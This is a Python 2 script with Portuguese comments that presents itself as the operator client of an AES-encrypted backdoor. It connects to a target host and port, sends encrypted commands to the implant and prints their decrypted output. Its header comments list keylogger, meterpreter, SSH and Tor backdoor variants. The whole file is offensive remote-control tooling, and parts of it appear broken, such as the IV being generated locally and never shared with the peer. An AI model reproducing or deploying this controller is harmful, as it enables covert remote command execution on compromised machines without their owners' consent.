#!/usr/bin/python

from Crypto.Cipher import AES
from Crypto import Random
import socket
import base64
import os
import optparse #argumentos
import sys # saida
import platform #plat version win/linux/unix
import subprocess # chamda de shell
#cores
cyanClaro="\033[1;36m"
vermelho = '\033[31;1m'
verde = '\033[32;1m'
azul = '\033[34;1m'
normal = '\033[0;0m'
purpleClaro= '\033[1;35m'
amarelo= '\033[1;33m'
ciano='\033[46m'
magenta='\033[45m'
normal = '\033[0;0m'
#criador darkcode
#code main
#backdoor aes/base64
#keylloger v2  16 de mar;o de  2017 
#backdoor meterpreter v2
#backdoor ssh v3
#backdoor tor v4
##modulos######
def help():#lista de ajuda e comandos internos v2 powershell
    print(cyanClaro+"list: => ver comandos\nshell: => chama o pront \nsair: => fecha a conexao(aes)"+normal)
def getshell():#chama(shell(roo/1000),(cmd/powershell))
    print(verde)
    print("bash       =linux/mac")
    print("sh         =linux/mac")
    print("cmd        =windows")
    print("powershell = windows ")
    dsa = raw_input("interno =>")  # chamda de root/user normal para shell do os
    subprocess.call(dsa)#invoca


#######
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))#criptografa
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))#descriptografa

# Criptografar / codificar e decodificar / decodificar uma string
senha  = raw_input("coloque a sua senha => ") # chave ponta a ponta aes 32
secret = senha
iv = Random.new().read(AES.block_size)
cipher = AES.new(secret, AES.MODE_CFB, iv)

# Parse argumento da linha de comando
parser = optparse.OptionParser("usage: python client.py -d <host ip> -p <port>")
parser.add_option('-d', dest='host', type = 'string', help = 'target host IP')
parser.add_option('-p', dest='port', type = 'int', help = 'target port')

(options, args) = parser.parse_args()
if (options.host == None):
    print parser.usage
    sys.exit()
elif (options.port == None):
    print parser.usage
    sys.exit()
else:
    host = options.host
    port = options.port
# Conectar ao host do servidor
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# main
while True:
    data = s.recv(1024)

   # Descriptografar dados
    decrypted = DecodeAES(cipher, data)
	# Verificar para o fim do arquivo
    if decrypted.endswith(secret) == True:
	    # Comando de impressao
        #print decrypted[:-16]

        # recebendo comando
        print(azul+"[list,shell,sair]"+normal)
	cmd = raw_input(verde+"["+azul+vermelho+"ia=deamon"+cyanClaro+"-shell =>]$ ")
    	if cmd == "list":
            help()
        elif cmd == "shell":
            getshell()
        elif cmd == "sair":
            break

        else:
            print(vermelho+"=>"+azul+"comando errado"+normal)

        #Criptografar o comando
        encrypted = EncodeAES(cipher, cmd)
		# Enviar comando criptografado

        s.send(encrypted)
        # Verifique se o usuario digitou "exit" para sair shell remoto

    else:
        print decrypted
s.close()
sys.exit()
